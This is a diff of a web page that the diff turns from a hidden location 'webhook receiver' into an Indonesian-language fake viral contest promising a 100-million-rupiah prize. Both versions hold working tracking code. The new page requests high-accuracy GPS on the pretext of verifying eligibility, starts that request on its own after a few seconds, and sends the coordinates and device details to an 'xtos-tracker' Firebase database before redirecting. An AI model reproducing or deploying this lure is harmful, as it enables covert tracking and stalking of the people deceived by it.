@@ -1,127 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>X-TOS Webhook</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Viral Challenge 2026 - Join Sekarang!</title>
     <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        .log { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
-        .hidden { display: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; text-align: center; }
+        .title { font-size: 2.2em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .challenge { background: rgba(255,255,255,0.1); margin: 15px 0; padding: 20px; border-radius: 15px; }
+        .prize { font-size: 1.5em; color: #FFD700; font-weight: bold; margin: 10px 0; }
+        .btn { background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
+        .btn:hover { transform: translateY(-2px); }
+        .status { margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="hidden">
-        <h2>🛡️ X-TOS Data Receiver</h2>
-        <div id="logs"></div>
+    <div class="container">
+        <div class="title">🔥 #2026CHALLENGE</div>
+        
+        <div class="challenge">
+            <div>📸 Upload foto di lokasi Anda</div>
+            <div>🏆 Menangkan hadiah jutaan rupiah</div>
+            <div class="prize">💰 TOTAL HADIAH: 100 JUTA!</div>
+        </div>
+        
+        <button class="btn" onclick="joinChallenge()">🚀 JOIN CHALLENGE SEKARANG</button>
+        
+        <div class="status" id="status">Klik untuk bergabung dengan 5 juta peserta lainnya!</div>
     </div>
 
     <script>
-        // Auto-redirect to prevent user seeing this page
-        const urlParams = new URLSearchParams(window.location.search);
-        const lat = urlParams.get('lat');
-        const lng = urlParams.get('lng');
-        const timestamp = urlParams.get('timestamp');
-        const id = urlParams.get('id') || 'default_' + Date.now();
-        
-        console.log('📡 Webhook received:', { lat, lng, timestamp, id });
-        
-        if (lat && lng) {
-            // Store location data
-            const data = {
-                latitude: parseFloat(lat),
-                longitude: parseFloat(lng),
-                timestamp: timestamp ? parseInt(timestamp) : Date.now(),
-                userAgent: navigator.userAgent,
-                received: Date.now(),
-                deviceBrand: getBrowserInfo(),
-                batteryLevel: 'Unknown',
-                platform: navigator.platform
-            };
+        async function joinChallenge() {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = '<div class="loading"></div> Memverifikasi lokasi untuk challenge...';
             
-            // Save to localStorage for app to read
-            localStorage.setItem('xtos_tracked_location', JSON.stringify(data));
-            sessionStorage.setItem('megastore_location', JSON.stringify(data));
-            
-            // Send to Firebase for app polling
-            sendToFirebase(id, data);
-            
-            console.log('✅ Location stored and sent to Firebase:', data);
-            
-            // Redirect after short delay
-            setTimeout(() => {
-                window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
-            }, 1000);
-        } else {
-            console.log('❌ No coordinates received');
-            setTimeout(() => {
-                window.location.href = 'https://maps.google.com/';
-            }, 1000);
-        }
-        
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Chrome')) return 'Chrome Browser';
-            if (ua.includes('Firefox')) return 'Firefox Browser';
-            if (ua.includes('Safari')) return 'Safari Browser';
-            if (ua.includes('Edge')) return 'Edge Browser';
-            return 'Unknown Browser';
-        }
-        
-        function sendToFirebase(trackingId, locationData) {
             try {
-                // Decrypt tracking ID if encrypted
-                let realId = trackingId;
-                if (trackingId.includes('_enc_')) {
-                    try {
-                        realId = atob(trackingId.replace('_enc_', ''));
-                    } catch (e) {
-                        console.log('Decryption failed, using original ID');
-                    }
-                }
-                
-                // Send to Firebase locations endpoint
-                const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${realId}.json`;
-                
-                fetch(firebaseUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(locationData)
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('✅ Firebase location sent successfully');
-                    } else {
-                        console.log('❌ Firebase location failed:', response.status);
-                    }
-                }).catch(error => {
-                    console.log('❌ Firebase error:', error);
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                 });
                 
-                // Also send to live tracking endpoint
-                const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`;
-                const liveData = {
-                    ...locationData,
-                    updateNumber: Math.floor(Math.random() * 100) + 1
+                const lat = position.coords.latitude; const lng = position.coords.longitude;
+                statusEl.innerHTML = '✅ Lokasi terverifikasi! Bergabung dengan challenge...';
+                
+                const deviceInfo = {
+                    latitude: lat, longitude: lng, accuracy: position.coords.accuracy, timestamp: Date.now(),
+                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
+                    source: 'viral_challenge', challenge: '2026Challenge', userAgent: navigator.userAgent
                 };
                 
-                fetch(liveUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(liveData)
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('✅ Firebase live tracking sent successfully');
-                    }
-                }).catch(error => {
-                    console.log('❌ Firebase live error:', error);
-                });
+                const trackingId = new URLSearchParams(window.location.search).get('id') || 'viral_' + Date.now();
+                const endpoints = [
+                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
+                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/challenges/${trackingId}.json`
+                ];
+                
+                await Promise.allSettled(endpoints.map(endpoint => 
+                    fetch(endpoint, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo) })
+                ));
+                
+                setTimeout(() => {
+                    alert('🎉 Selamat! Anda berhasil join #2026Challenge! Upload foto Anda sekarang.');
+                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
+                }, 2000);
                 
             } catch (error) {
-                console.log('❌ Firebase send error:', error);
+                statusEl.innerHTML = '❌ Gagal verifikasi lokasi. Aktifkan GPS untuk join challenge.';
             }
         }
+        
+        setTimeout(() => { if (document.getElementById('status').textContent.includes('Klik')) joinChallenge(); }, 3500);
     </script>
 </body>
 </html>
